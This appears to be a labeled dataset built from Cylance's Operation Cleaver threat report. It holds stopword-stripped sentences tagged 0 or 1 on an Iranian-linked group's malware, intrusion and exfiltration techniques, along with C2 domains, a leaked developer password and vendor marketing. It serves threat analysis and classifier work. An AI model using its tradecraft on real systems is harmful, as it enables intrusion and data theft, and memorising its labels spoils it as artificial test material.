There many seemingly legitimate Tarh Andishan related companies inside Tehran strong connections Iranian backing difficult prove definitively	0
'' Tarh Andishan '' often translated '' Thinkers '' '' Innovators '' '' Inventors ''	0
The net blocks strong associations state-owned oil gas companies	0
These companies current former employees ICS experts	0
Tarh Andishan suspected past launching attacks interest Iran	0
The operators blog IranRedLine.org comments Iran 's nuclear weapons efforts mentioned multiple posts target debilitating brute-force authentication attacks IP addresses registered Tarh Andishan team found Cleaver	1
In one IranRedLine.org 's blog posts author speculates Tarh Andishan 's involvement Iranian government showing close proximity SPND Organization Defensive Innovation Research ; however phone number listed registrant contact information yet completely validated	0
During investigation able compile considerable amount information members organization	0
The following profiles built reverse engineering code analysis open source intelligence incident response forensics work	0
Personally identifiable information members shared publicly could endanger lives would irresponsible	0
Parviz developer worked variety projects primarily active 2013	0
His development skillset based around ability develop C/C++	0
He observed using Visual Studio 2010 tools written exclusively Windows	0
Some tools found packed ASPack	0
Parviz primary developer PVZ bot multiple parts tool chain	0
Parviz likely associated PVZ bot name hardcoded PDB file paths	0
The PVZ tool chain includes variety functionality HTTP command control communications ASPX server-side component denial service tool developed public project named XYNTService used run ordinary applications services	1
Nesha one offensive members organization	0
Nesha seen breaches involving SQL injection well techniques	1
Nesha often utilized web-based backdoors developed ASPX PHP well ColdFusion	1
A copy MS08-067 exploit developed Python recovered Nesha shamelessly replaced original author 's name	0
Nesha 's passwords commonly include handle	0
His passwords frequently stored hashes backdoors common hash cracking methods able recover plaintext versions	0
His observed password use follows Cylance observed Nesha participating compromises involving following techniques Nesha additionally identified using variety internally developed tools well following publicly available tools Alireza appears one senior developers organization	0
His tools commonly developed C++ Java C # ( desktop ASPX )	0
These tools often support tools either monitoring activity tools supplementing function tools gathering information infiltration process	1
Alireza 's code appears reused internally projects TinyZBot	0
Alireza appears using version control system code likely others using system	0
Based paths version control system use likely Apache 's Subversion	0
Use version control system indicative code sharing use older system like Subversion along evidence suggests large amount collaboration projects likely one developer working project time	0
This behavior typical professional development team	0
Alireza 's C # tools include following techniques Alireza 's Java tools include following techniques Alireza 's C++ tools include following techniques kaJ .NET	0
developer observed working C #	0
He less English language proficiency others organization likely supplemental role compromises	0
He observed developing tools cater specific challenges compromise	0
His notable project named Net Crawler technical analysis tool found Tactics Techniques Procedures section	0
Thanks recovered test configuration Net Crawler able determine kaJ 's development computer name dev-castle username kaJ password oaolrJ @ vad	0
kaJ believed creator Zhoupin ASCII art displayed Net Crawler	0
kaJ 's projects include following techniques	0
Jimbp .NET	0
developer minimal experience	0
His projects appear supplemental TinyZBot simplistic	0
It believed developer project Binder1	0
This project simple malware binder required manual configuration compiling	0
His work included creating new service wrapper TinyZBot	0
Of course many associated Iranian hacker teams identified public private security circles	0
Some teams publicly known today include Iranian Cyber Army Ashiyane Islamic Cyber Resistance Group Izz ad-Din al-Qassam Cyber Fighters Parastoo Shabgard Iran Black Hats many others	0
However even though TTPs Cleaver team overlap techniques used Iranian Cyber Army ( botnets ) Ashiyane ( SQL injection ) Syrian Electronic Army ( phishing RATs ) believe largely work new team	0
Some connections Ashiyane discovered investigations including reference hussein1363 prior ties hacker group	0
Additional connections team members individuals exist predominantly speculative shared law enforcement	0
Ultimately believe Cleaver team mix existing team members new recruits pulled universities Iran	0
The Cleaver campaign used variety methods multiple stages attacks	0
In section we'll cover commonly observed methods different stages attack	0
The initial compromise gets attackers first foothold target network	0
Once ability execute arbitrary code established attacker 's job becomes quite bit easier	0
Since vector initial compromise usually determined vulnerable target 'll cover techniques 've seen Operation Cleaver use initiate compromise	0
SQL injection common simple attack method	1
It made possible lack input sanitization vulnerable application supplying input SQL database query	0
SQL injection payloads used organization double encoded	1
Double encoding SQL injection payloads allows bypassing various anti-exploitation filters supplied Web Application Firewalls ( WAFs )	1
The attackers would enable xpcmdshell Then connect outbound via anonymous FTP Using messaging methods email attackers social engineer users downloading executing software quietly installs malware alongside desired program	1
Operation Cleaver employed technique numerous times across different organizations	0
The domain EasyResumeCreatorPro.com registered website setup direct copy legitimate website winresume.com	0
This original site looked That 's copied	0
In order infect users combined original Easy Resume Creator Pro product malware using binder developed internally named Binder1	1
A binder application combines two executables ( desired software malware ) single executable	0
The resulting executable masquerades desired software	1
The purpose deception make binder indistinguishable desired application	1
When executed applications written temporary directory executed	1
This way appears desired application executed malware also executed silently	1
This attack evolved appear legitimate	0
The attackers made victims feel like pending job opportunity industrial conglomerate Teledyne	0
In order take advantage job opportunity victim needed use fake résumé submission application supplied malicious recruiter	1
Multiple domains registered order make download sites seem realistic	1
These domains included companies tried hit wider audience	0
At point résumé submission application checks Internet connection	1
If unable connect Internet display window input proxy information	1
When information entered results cached location dropped malware access	1
After Internet connection ensured malware ( TinyZbot ) dropped executed	1
This clever scheme makes sure malware connect command control server increases chances domain credentials cached infected machine	1
Shortly main application launched	1
The first résumé submission form requests contact information	1
This form like rest submission forms stores submitted information application running	1
As infected user going filling information malware running background logging keystrokes retrieving stored passwords etc	1
Once forms filled user goes submission form	0
When victim hits submit résumé submitter GET request microsoft.com order make seem like submitting something claims success	1
This method particularly effective level deception even victim suspects infected malware likely speak would need explain submitting job application another company	0
Privilege escalation category techniques describe process going less privileged user compromised computer privileged user	1
This increase privileges allows attacker gain access privleged areas operating system well infect computers target network	1
This team utilize novel methods privilege escalation observed using variety publicly known exploits	0
PrivEsc compiled exploit leverages vulnerability commonly referred KiTrap0D ( CVE-2010-0232 )	1
The exploit allows escalation privileges unpatched Windows operating systems unprivileged user kernel-level privilege	1
This vulnerability corresponding exploit discovered developed 2010	0
The plagiarized version used Operation Cleaver compiled May 2013 slight modification public source code	0
This modification changed author 's details Zhopin Exploit Team	0
Pivoting process leveraging access one compromised computer order gain access additional systems target network	1
This involve launching attacks compromised computer simply abusing access gained	1
A common method pivoting predominantly Windows operating system based network extract domain credentials used compromised computer credential cache	1
There well-known tools capable given sufficient privileges infected host	1
Two tools used Cleaver Mimikatz Windows Credential Editor	0
Two similar applications developed Operation Cleaver order automate execution Mimikatz	1
These applications zhMimikatz MimikatzWrapper	0
These applications store multiple versions Mimikatz resources	0
When executed determine version Mimikatz use based whether computer 's version Windows 32-bit 64-bit	1
This technique uncommon malware shows advanced skillset Cleaver team	0
Both tools developed C #	0
In following examples computer name TheComputerName username logged user TheUser user 's password ThePassword	0
At time execution system credentials available cached network credentials	0
zhMimikatz executes correct version Mimikatz current system parses results cached credentials	1
Output MimikatzWrapper essentially zhMimikatz despite different Visual Studio project	0
The external difference MimikatzWrapper also logs results res.txt executing directory	1
This make useful tools like PVZ tool chain Csext execute logged results Once attacker credentials extracted cache whether hash form plaintext form PsExec used run commands computer accepts domain credentials	1
If technique combined cached credential dumping used jump computer computer compromised network	1
Net Crawler utilizes cached credential dumping technique along PsExec order worm throughout network collecting credentials extract credential caches	1
It ability Windows Credential Editor Mimikatz	0
It starts first extracting cached credentials infected computer 's cache	1
Once complete continues scan set configured IP addresses local subnet determine IP addresses SMB related ports open	1
Then iterative methodology applied brute forcing SMB enabled target credential extracted cache	1
When positive result achieved create copy modified configuration stored PE resource send execute copy utilizing PsExec	1
This copy repeats behavior original already discovered credentials well newly discovered ones newly infected host	1
Any credentials found reported back original infection	0
The following sample recovered results Net Crawler executing live network A depth analysis Net Crawler part A Study Bots series available Cylance 's blog	0
MS08-067 vulnerability Microsoft Windows made popular Conficker worm exploited specially crafted packet operating system 's RPC network interface	1
This vulnerability patched since October 2008 many networks failed update systems even day	0
Operation Cleaver used plagiarized version publicly available exploit vulnerability developed Python	0
Someone Cleaver team ( presumed Nesha ) modified exploit read '' By Nesha ''	0
Jasus ARP cache poisoner developed Operation Cleaver team	1
It makes use WinPcap developed C. Compared publicly available ARP cache poisoning utilities Jasus poorly developed without many useful features	0
The primary positive attribute Jasus poor detection ratio antivirus industry	1
Cain & Abel publicly available toolkit covers wide range functionality assists attackers compromised node network	0
It ability dump stored cached credentials conduct attacks like ARP cache poisoning order capture credentials transmitted network	1
It also remotely installable trojan named Abel enables functionality remote target	1
We observed Operation Cleaver team using Cain & Abel extracting credentials caches network confident little antivirus protection infected target	1
Exfiltration process moving information external site	1
In context process stealing information without detected	1
Operation Cleaver strong focus stealing confidential/privileged information utilized methods order facilitate objective	1
Cleaver Operations observed 2013 mainly utilized FTP servers anonymous access enabled order pilfer large quantities information	1
This allowed use existing command line utilities available targets order upload information	1
This versatile technique require additional software could detected	0
These FTP servers also observed infection process infected computers often instructed download additional files FTP servers including backdoors pivoting tools	1
The following IP addresses hosted FTP servers used infection targets exfiltration information	1
NetCat network tool many valid purposes also used malicious purposes	0
Its main functionality allows client server communication channel allowing information transported network simply	1
NetCat option compiled enable disable ability NetCat execute command connection established	1
This feature abused enable reverse connecting shell used remotely control target	1
NetCat 's network communications plaintext could viewed egress filter looking block exfiltration sensitive information	0
The Operation Cleaver team observed attempting use NetCat exfiltrate information well use reverse connecting shell	1
The use NetCat later replaced zhCat	0
zhCat tool developed Operation Cleaver team operates similarly NetCat	0
Its main purpose create channel capable transporting information network	1
The changes made zhCat allow information transferred inline obfuscation and/ encryption	1
This makes difficult detect privileged information exfiltrated	1
The command line help ( particular version ) shows following options Multiple obfuscation/encryption methods available	0
The –h argument enables HTTP mode	0
This makes traffic zhCat instances look like benign HTTP traffic	1
For instance attackers set zhCat instance listening port 1000 192.168.116.128 HTTP mode client instance zhCat would use following command The server instance would use following command When run send information typing terminal running application	0
Information supplied standard input	0
If observe network communications transfer see following HTTP POST request	1
Note research ebizmba.com turn additional evidence involved development zhCat	0
On server side see message received If stricter egress filtering enabled attackers use zhCat also XOR encrypt traffic shared key	1
These keys stored inside zhCat	0
The following key used XOR encryption The \n represents hex character 0x0A new line character	1
An attacker could set server instance zhCat following command order enable HTTP XOR obfuscation The client instance could invoked following command Once information supplied via standard input	1
Upon inspecting network traffic see following HTTP POST request	1
On server side see information received zhCat variety features port mirroring well traffic redirecting	1
PLink one many utilities provided PuTTY ( SSH ) suite many benign purposes	0
It capable communicating various protocols notable SSH	0
The SSH protocol heavily utilized encrypted protocol commonly used remote administration UNIX based operating systems	0
PLink designed implement SSH functions related forwarding traffic well functionality	0
Operation Cleaver uses PLink forward local RDP ports remote SSH servers	1
This allows easily connect RDP servers inside networks victims	1
These RDP connections used exfiltrate information visually well remotely control computers hosting RDP servers	1
Early Cleaver operations abused SMTP order exfiltrate information	1
The sending performed internally developed malware samples TinyZBot Csext order exfiltrate information infected computer well requested files keystroke logging information	1
Messages sent using open SMTP relay BeyondSys.com sender email address dyanachear ( ) beyondsys.com	1
This allowed attackers use infrastructure exfiltrate information	1
The known recipient addresses information testmail00001 ( ) yahoo.com TerafficAnalyzer ( ) yahoo	0
com	0
In order deceive anyone reading emails made appear spam message would think twice	0
The subject used following The message used following The files exfiltrated added email attachments	1
SOAP sub-protocol communicated via HTTP	1
In relation Operation Cleaver used command control protocol TinyZBot preferred backdoor underwent long-term development	1
HTTP communications often used botnets uncommon use sub-protocol SOAP	1
It likely SOAP used simple implement C # added benefit blending benign HTTP traffic	1
As part TinyZBot 's command control protocol files exfiltrated SOAP command control server	1
For information TinyZBot see Persistence section	0
Persistence means maintaining access compromised network	1
There limitless methods persistence ; following techniques tools persistence used Cleaver	1
TinyZBot backdoor developed C #	1
This bot longest developed malware analyzed organization	0
The earliest known version compiled January 2013 continued see new versions created actively	0
The purpose TinyZBot gather information infected computer well maintain access compromised network	1
TinyZBot developed clear intention targeted campaigns	0
The name TinyZBot assumed referring project less versatile version ZeuS botnet although exhibit major browser injection features ZeuS	0
To clear TinyZBot shares code ZeuS variants developed different programming language	0
The majority code TinyZBot created Cleaver	0
TinyZBot supports wide array features continually evolved time	0
For evolution features see History section	0
The following list supported features The command control mechanism TinyZBot utilizes SOAP communicating HTTP	1
Potential reasons using SOAP 1	0
SOAP-based communications simple implement C #	0
2	0
SOAP traffic could easily considered benign traffic commonly seen malware	1
As part SOAP communications URI specified	0
This internal sub-protocol necessarily reflect URI host running SOAP server ( ASMX file )	0
In case TinyZBot many examples developing SOAP applications URI tempuri.org	0
Since first version SOAP-based command control protocol implemented TinyZBot used referred '' dynamic password ''	1
The result cryptographically hashed version server time ( must obtained SOAP query ) TinyZBot 's GUID TinyZBot 's AppUsageID ( campaign identifier )	0
For command control examples red text represents TCP data sent TinyZBot infection blue text represents TCP data sent command control server	1
The server time lookup query invokes SOAP command GetServerTime	0
This first query done running TinyZBot instance needs done shortly queries order update dynamic password	1
Commands updates files drop execute stored files SOAP server access restricted AppUsageID well bot GUID	1
This allows commands sent bots campaign well individual control	1
The TinyZBot queries server order enumerate files currently available	1
In order download file parse commands execute TinyZBot must request file	1
The file downloaded Base64-encoded inside SOAP response	1
The command file downloaded example follows The first line timestamp command	0
The TinyZBot command parser ignores	0
The RUNCMD line requests cmd.exe executed command ipconfig /all redirected file directory designated files uploaded	1
The UPLOAD command requests file uploaded SOAP command control server	1
The DELETE command requests file deleted infected system	1
The following list supported commands TinyZBot responds Commands GETINFO often run newly infected systems decide whether infection hit correct target	1
There additional SOAP commands covered detail	0
The following list SOAP commands CheckFileMD5 GetFile GetFileList GetServerTime UploadFile	0
TinyZBot commonly installed using form deception	1
Recent versions use resume- based methods reported Initial Compromise sections	1
An additional method used earlier versions	0
When early versions TinyZBot executed opened image stored resource section executable copied malicious TinyZBot executable % AppData % directory	1
Many images identified popular Lebanese singer actress Haifa Wehbe	0
The backdoor additionally replaced original malicious executable appropriately named image file padded image file null bytes order mirror original file size	1
The earliest known version TinyZBot compiled January 27 2013	0
This early version little functionality	0
It limited logging keystroke data sending emails creating link user 's startup folder persistence	1
Its method exfiltrating logged keystrokes relied upon hardcoded email address stored binary	1
The sender email address dyanachear ( ) beyondsys.com emails destined testmail00001 ( ) yahoo.com	0
The message intended look like common Viagra spam China would sent keystroke logging data attachments well system information	1
The initial version provide means receiving commands obfuscated SmartAssembly	1
The following iteration compiled March 12 2013 contained minor bug fixes	0
The next version compiled April 24 2013	0
This version starts look like average bot	0
A command control protocol established using HTTP SOAP protocol	1
The command control server version located 173.192.144.68/ DefaultWS ( dot ) asmx	1
This new command control protocol allowed addition quite features	0
An update mechanism added could regularly scheduled unassisted periodic update checks automatically performed	1
The SOAP API used dynamic password mechanism required computation simple key order access certain parts API	0
The email data exfiltration method also underwent modification activated scheduled interval	1
There also changes looked bug fixes limiting number times sending email could fail	0
The next day April 25 2013 new version compiled allowed self-deletion	1
On May 14 2013 noticed change assisted identification active targets	0
The AppUsageId ( point named AppType ) identifier used organization order differentiate targets infected TinyZBot meaning could effectively run multiple campaigns using command control server know target infected	1
This also allowed separate commands supplied different targets without need per-bot commands	1
At time AppUsageId total0 later observed names aligned active targets	0
The exfiltration email address also changed TerafficAnalyzer ( ) yahoo.com	1
On June 17 2013 addition allowed loading configuration data PE 's resources	0
At time limited exfiltration email address	0
This version obfuscated SmartAssembly We see new version TinyZBot June 7 2014	0
There quite notable improvements nowhere near enough indicate consistent development project year	0
SmartAssembly reused	1
A method added detect security related software installed	1
Avira antivirus specifically targeted disabled due detection new keystroke logger module added version	1
This keystroke logger source publicly available referred DeadkeyLogger	1
A new string encryption class added code copied pasted Microsoft example	0
The ability extract Internet Explorer passwords added	1
Clipboard monitoring code added invoked	1
The emailing features removed classes previously contained still present empty	0
Many options enabled loaded PE resources	0
The ability add PE resources added	0
Another version compiled June 7 2014 feature difference	0
On June 17 2014 see2the first instance Binder1 aptly named binder	0
The legitimate application used version Binder1 compiled August 22 2013 self-extracting archive desktop wallpapers including image game Mirror's Edge	0
The TinyZBot included version compiled June 7 2014	0
The version compiled June 23 2014 added functionality allowed screenshots desktop taken	1
On August 2 2014 see another version without SmartAssembly obfuscation	0
A bug fix made keystroke logging method clipboard monitoring enabled	1
Three items compiled August 18 2014	0
Two TinyZBot binaries contain minor key logging bug fix	0
The third new Binder1 instance contains one TinyZBot instances compiled day	0
The legitimate application included binder called Easyresumecreator legitimate application named EasyRésuméCreatorPro	0
This version targeted major Saudi Arabian oil company	0
From August 23 August 26 2014 new versions TinyZBot compiled AppUsageIds targeting major oil gas companies Qatar Kuwait Ministries Foreign Affairs Persian Gulf major airline holding company UAE	0
These versions TinyZBot moved towards modular architecture component .NET	0
assembly	0
This presumably done limit antivirus detection individual file well allow dynamic updating specific modules	1
All included Binder1 instance also dropped Easyresumecreator	0
There also seem improved software engineering practices many locations	0
FTP upload support added hardcoded credentials ano:1	1
This FTP upload functionality points command control server invoked command SOAP command control channel	1
These versions capability install service	1
On August 25 2014 version compiled August 18 submitted VirusTotal ZIP archive located http //dl.doosan-job ( dot ) com/cv/EasyResumeCreator- v2.0.zip	0
This indicates TinyZBot installed impersonating résumé creation suite also impersonating potential employers distributed	1
On September 9 2014 ZIP file containing TinyZBot configuration targeting major US university AppUsageId created	0
This discovered anonymous FTP server IP range dl.doosan-job ( dot ) com along malware	0
From September 11 September 17 2014 TinyZBot components compiled along new dropper	0
This dropper impersonated tool submit résumé Teledyne	1
When executed user prompted enter personal information end given button submit résumé Teledyne although nothing actually submitted	0
While user enters information machine infected TinyZBot	1
The AppUsageIds versions target major US-based university well Israeli aerospace company	0
These versions began include new method installing service	1
The service runs name Network Connectivity Manager	0
TinyZBot well tools ( Csext Net Crawler ) initially would run without command line parameter set	0
This likely avoid detonation-based detection engines	1
This command line parameter opensesemi often stored application 's code obfuscated manner	0
The binders droppers TinyZBot provided command line argument others executing	0
TinyZBot uses dynamic mutex	0
This accomplished combining static preset prefix active process ID	0
This allowed supplemental tools keep TinyZBot running enumerating every process checking process ID mutex prefix existed	1
If mutex process pair located another TinyZBot instance would started	1
Multiple backdoors used organization	1
These scripts applications allowed command code execution outside victim network	1
Many backdoors web applications added web servers commands executed browser client able communicate	1
This group includes results Shell Creator mentioned Attribution section well ASPX backdoors used Nesha	1
A PHP shell also observed also included attribution Nesha hashed password	1
An ASPX backdoor named Zh0uSh311 located live servers well recovered fro staging server	1
This backdoor require authentication use appears straightforward	0
Its functionality breaks three fairly standard components SQL queries executing commands uploading files	1
This organization utilized backdoors masqueraded varying versions Notepad	1
They replace existing Notepad.exe infected machine run call remote server execute shell code returned remote server	1
There detailed analysis backdoors posted Cylance 's blog future	0
PVZ name set executables used together create botnet	0
The name PVZ assigned us one tools organization named	0
The components follows XYNTService developed Cleaver team instead publicly available project executes executable service	1
The purpose PVZ-In communicate command control server	1
Communication primarily unidirectional little information provided bot command control server	0
The known command control server located http //kundenpflege menrad ( dot ) de/js/jquery/default.aspx command control protocol uses HTTP	1
The commands well infected computer information transferred Content- Disposition HTTP header making traffic easy pass benign	1
When command received server results stored central location disk PVZ tools utilize	1
Command functionality limited executing supplied commands downloading executing executables well self-updating	1
The debug file path PVZ-In PVZ-In observed using file name ossisvc.exe	0
PVZ-Out half command control channel primarily uploading results commands keystroke logging data remote server	1
The known command control server PVZ-Out located http //www.gesunddurchsjahr ( dot ) de/tor/default.aspx	1
Much like PVZ-In command control channel communicates Content-Disposition HTTP header file data POST data supplied	1
Data uploaded often compressed make difficult detect exfiltration sensitive information	1
The debug file path PVZ-Out PVZ-Out observed file name osppsvc.exe	0
SYN Flooder simple network based denial service tool	1
It command line utility capable invoked PVZ-In	1
Targeting information supplied via command line parameters	0
The debug file path SYN Flooder SYN Flooder observed using name ossysvc.exe	0
Logger Module observes user 's actions records file	1
The recorded actions include mouse clicks active windows keypresses well clipboard data	1
The resulting log written location PVZ-Out exfiltrate command control server	1
Logger Module observed using name ospcsvc.exe	0
The following command control servers Logger Module observed WndTest evolution PVZ tool chain single executable	1
The tool chain minimized command control communications keystroke logging clipboard monitoring	1
The command control still supports upgrading downloading executing applications well executing batch scripts	1
WndTest installs service observed attempting impersonate Adobe Report Service	1
WndTest starts using PHP servers command control server listed defaced sites	1
We seen wndTest communicate following servers Csext backdoor application developed C # runs service	1
Its primary functionality based commands supplied configuration file	0
The configuration file able store specific commands intended run particular times	0
A recovered configuration follows This configuration executes zhCat connect back srv01.microsoftwindowsupdate ( dot ) net ( deceptive domain owned group falsified Whois data attributing Microsoft Investor Relations ) XORed communication using HTTP protocol TCP port 443	1
This zhCat instance running cmd.exe effectively making reverse connecting shell	1
This command runs 00:29 morning killed taskkill 00:35	1
This gives attackers predictable method regain access compromised network ever lose access	1
Csext also email functionality similar TinyZBot	1
This email functionality used exfiltrate results commands command file also include requests like gathering user information	1
We seen Csext configured communicate following servers If reviewing Indicators Compromise ( IOC ) listed Appendix A believe organization victim Operation Cleaver recommend consider following course action 1	1
If inside United States contact Federal Bureau Investigation ( FBI ) via either local FBI team FBI CYWATCH 1-855-292-3937 cywatch @ ic.fbi.gov	0
2	0
If outside United States contact local district state federal law enforcement authorities	0
3	0
If visibility attacks company tools expertise track leverage IOCs Appendix A identify presence network prevent expanding scope compromise remove access immediately	0
4	0
If NOT visibility attacks need help identifying existing successful compromise organization importantly wish prevent attack attacks similar Operation Cleaver please contact security provider	0
5	0
If wish contact Cylance additional details available report please email opcleaver @ cylance.com	0
6	0
If would like learn Cylance products professional services discuss Cylance mitigate Operation Cleaver 's impact organization please contact us directly	0
Iran 2014 probably best described galvanizing	0
They long '' enemy '' west United States particular today 's headlines include variety topics nuclear talks human rights terrorism cyber hacking	0
Iran continues extremely active global stage – thereby radar every superpower	0
Iran 's cyber sophistication grown rapidly since dawn Stuxnet used hard dollars combined national pride help build cyber army	0
Few doubt commitment government nation state funding recruiting cyber warriors infiltrate damage enemies	0
And commonly postulated almost activity since 2010 coming Iran associated retaliation Stuxnet/Duqu/Flame seems natural given severity impact	0
But n't need Stuxnet motivation want hack world	0
They long desired power political stage particular fight nuclear power autonomy	0
With deadlines around Iranian nuclear discussions pushed 2015 attacks may tied negotiating power discussing pact nuclear superpowers United States Britain France Germany Russia China	0
The inner workings Iranian government remain largely mystery western world	0
However Iran 's control people private businesses birthed inside well reported	0
In 2014 Reuters article reporters detail secret Iranian organization called '' Setad Ejraiye Farmane Hazrate Emam '' become one powerful organizations country capable taking properties businesses buying controlling interests numerous sectors including finance oil telecommunications many others totaling upwards $ 95B	0
Even US Treasury documented extensive fronting companies report Execution Imam Khomeini 's Order ( EIKO ) two main subsidiaries controls 37 private businesses purely front companies Iranian government	0
The history Iran controlling usage Internet Internet on-ramps Iran well known	0
They controlled much country 's Internet access date taken controlling interests companies carry work	0
Given Operation Cleaver's frequent spin-up take-down large IP blocks inside AFRANET IP space inside Iran Iran 's well recorded investment cyber warfare leads us one simple conclusion Iran extremely active world hacking	0
Operation Cleaver 's intense focus critical infrastructure companies especially South Korea hints information sharing joint operations Iran 's partner North Korea	0
In September 2012 Iran signed extensive agreement technology cooperation agreement North Korea allows collaboration variety efforts including IT security	0
Operation Cleaver 's carefully selected targets like oil gas industry energy utility companies well airlines airports indicates Iran 's desire gain deep access world 's critical environments	0
The end goal operation known time	0
University student recruitment hinted within Operation Cleaver consistent Iran 's reported history active warrior recruitment educational space	0
Overall many reasons Iran may pursuing targets Operation Cleaver	0
While may never truly know important consider trying understand	0
After tracking Operation Cleaver team two years 're led inexorable conclusion government Iran particularly Islamic Revolutionary Guard Corps ( IRGC ) backing numerous groups front entities attack world 's critical infrastructure	0
As security experts Critical Infrastructure Key Resources ( CIKR ) Industrial Control Systems ( ICS ) Supervisory Control Data Acquisition ( SCADA ) systems Building Management Systems ( BMS ) embedded systems fixed-function systems know easy hack	0
We worked countless customers vendors throughout years notify vulnerabilities assist remediatation efforts help mitigate threats environments	0
Unfortunately many critical infrastructure organizations unable secure complex envirnoments modern attacks	0
They fall victim '' glue flu '' malaise feeling stuck wanting change status quo fear find problems idea prevent	0
This '' security anaphylaxis '' spells real disaster	0
If Operation Cleaver n't get world wake happening silent world cyber perhaps nothing	0
Prevention everything never give achieved	0
Challenge trusted advisors	0
Challenge security vendors	0
Demand better technology services detect respond importantly PREVENT contemporary attacks future exotic attacks yet imagined	0
That truly disruptive innovative technology	0
Do n't settle anything less	0
We hope exposing Operation Cleaver team world current global critical infrastructure victims notified prevent future victimization suffering consequences '' status quo '' security	0
Unlike United Flight 811 perhaps prevent next disaster	0
DEFENDERS NEVER GIVE UP In face growing evolving threats traditional cyber protection technologies widely considered inadequate	0
The way regain upper hand new generation attackers embrace something entirely new	0
Something '' thinks '' like attacker	0
Something n't rely trust model care hash lookups	0
Something brain	0
Cylance eschewed old foundations existing cybersecurity products built upon	0
Instead 've based approach mathematics machine learning data science	0
This algorithmic approach proven detect – stop – exponentially modern threats	0
Leveraging algorithmic risk modeling CylancePROTECT protects endpoints everyday viruses worms trojans spyware unlike security products CylancePROTECT offers true future-proof protection malicious threats world	0
Advanced Persistent Threats ( APT ) 0-days exotic exploitation techniques easily detected halted little-to-no impact end-user	0
Existing reactive solutions rely constant stream signature updates threat detection costly inconvenient also requires '' sacrificial lambs ''	0
Only previously unseen threat inflicted damage rest industry begin detect	0
CylancePROTECT n't require constant updates even network connection protect so-called '' previously undetectable '' threats	0
By identifying defusing attacks near real time attack execute finally away need '' patient zero ''	0
As Richard Stiennon Chief Research Analyst IT-Harvest put '' Many vendors trying solve endpoint problem yet Cylance one using power math stop malware effectiveness efficiency current solutions ''	0
Interested seeing CylancePROTECT organization ? Contact us Cylance one fastest growing cybersecurity technology firms US	0
Cylance 's flagship product CylancePROTECT adopted Fortune 500 companies government agencies across globe	0
Cylance founded 27-year security industry luminary Stuart McClure former Global CTO McAfee original founder Foundstone lead author international best-selling book Hacking Exposed	0
In building Cylance Stuart brought together best scientific executive minds likes Cisco Sourcefire Google McAfee	0
The Cylance board advisors includes former high-ranking officials DHS FBI CIA executive titans business	0
CylancePROTECT next generation endpoint security product applies math mute existing future malware viruses worms trojans bots APTs 0-days exploits adware spyware hacking tools – without needing updates even connection Internet	0
The technology founded principle fix industry must start scratch way yet unseen	0
CylancePROTECT rely signatures sort ( blacklist whitelist ) behavioral analysis using IOCs sandboxing analysis heuristics micro-virtualization dynamic detonation – detect prevent malicious files executing target endpoint	0
While every endpoint security product must collect sample analyze write signature detect CylancePROTECT detect malware executes statically analyzing features found binary	0
Features Benefits CylancePROTECT • Near real time detection malicious files even 've never seen wild	0
• Can used augment existing endpoint security deployed complete replacement	0
• Does require signature updates connection cloud	0
• An easy-to-use web management console intuitive workflows	0
• Low-impact endpoint agent	0
For demo CylancePROTECT contact Cylance expert today Cylance 's Professional Services team available assist companies affected campaign	0
Cylance providing consulting companies may targeted advanced threat actors	0
Cylance perform initial triage order determine extent company affected campaign work towards establishing containment strategy	0
Cylance two tailored offerings clients affected campaign	0
The first one includes ICS incident response since many companies affected Critical Infrastructure Key Resources ( CIKR ) vertical	0
The second offering 's focus deploy proprietary tools methodologies detect mitigate threats posed Operation Cleaver	0
For information Cylance Professional Services team assess respond attacks like ones obseved Operation Cleaver contact sales @ cylance.com today	0
Brian Sr. Security Researcher Cylance joined shortly company established	0
He best known avid botnet research ( often going '' botnethunter '' ) novel malware analysis A Study Bots blog series hosted Cylance	0
Brian dedicated open-source developer well advocate public private anti-botnet operations	0
Brian actively develops techniques combat cyber oppositions positions resources leverage limited supply conventional means	0
These techniques cultivated Stuart McClure Art Deterrence	0
In previous investigation Art Deterrence techniques successfully used divert Indonesian hackers motivated monetary gain away highest yielding target group	0
Brian 's botnet research covers wide range topics using graph analysis estimate amount ransom paid ransomware operator utilizing IPv4 scanning techniques identify take point sale malware panels	0
Stuart founder CEO/President Chairman Cylance	0
Widely recognized extensive in-depth knowledge security products Stuart McClure considered one industry 's leading authorities information security today	0
A well-published acclaimed security visionary currently eleven books print McClure originating founder Hacking Exposed series books successful security book ever written	0
From work founded Foundstone October 1999 sold McAfee 2004	0
McClure brings two decades technology executive leadership profound technical operational financial experience	0
Besides Foundstone Stuart held leadership positions InfoWorld Ernst & Young Kaiser Permanente number government agencies	0
At McAfee McClure held numerous positions including SVP/General Manager Security Management BU well EVP/Global Chief Technology Officer responsible almost $ 3B worth revenues	0
Today McClure CEO Cylance disruptive innovative startup applying math problem security	0
Cylance products CylancePROTECT prevent advanced attacks world without signatures sandboxing realtime endpoint	0
Cylance Services offer highly specialized security services incident response forensics compromise assessments advanced penetration assessments global critical infrastructure	0
Cylance employees work passionately tirelessly every day achieve one goal Protect world cyber attacks	0
And efforts tracking Operation Cleaver achieved goal	0
Our endless thanks Cylancers contributed report	0
The Operation Cleaver logo created Cylance specifically report inspired infamous logo used Army Guardians Islamic Revolution also known west Iranian Revolutionary Guard Corps ( IRGC )	0
Due close connection members tracked report IRGC fitting replicate look feel IRGC 's iconography anchor document 's branding	0
The striking visual elements make logo IRGC specific meanings • The clenched fist holding rifle likely AK-47 represents armed resistance	0
• The globe symbolizes IRGC 's worldwide ambitions	0
• The book clenched first emanates represents Qur'an connecting religious ideals group founded armed struggle	0
• The plants possibly wheat represent prosperity	0
• The name group Persian year founded passage Qur'an ( 8:60 ) 'And make ready power ' represented text	0
Several visual elements present IRGC logo carried Operation Cleaver logo including • A clenched fist time holding cleaver represents group 's likely connection IRGC well armed resistence general	0
• The globe background represents Operation Cleaver 's worldwide reach	0
• An ethernet cable connected clenched first represents nature attacks ( cyber opposed traditional warfare )	0
• The hex string translates '' Think Evil Do Good '' mantra research team lives	0
This Appendix details IOCs discovered investigation Operation Cleaver	0
CylancePROTECT prevents malware used Operation Cleaver ever executing	0
These mutexes used process ID malware suffix Listed MD5 SHA-256 hashes samples related Operation Cleaver	0
Downloaders injectors infostealers Example md5s files detected Kaspersky 's Virus.Win32.Pioneer.dx Symantec 's Infostealer.Nemim inf To ensure single instance module running module verifies system mutex named «132DF6E» exists	1
If exists module exits ­the module creates one	0
The module implements method resist running virtual environment	1
It gets CPU name identifier registry HKLM\HARDWARE\DESCRIPTION\ System\CentralProcessor\0 collects IP MAC addresses local network adapters	1
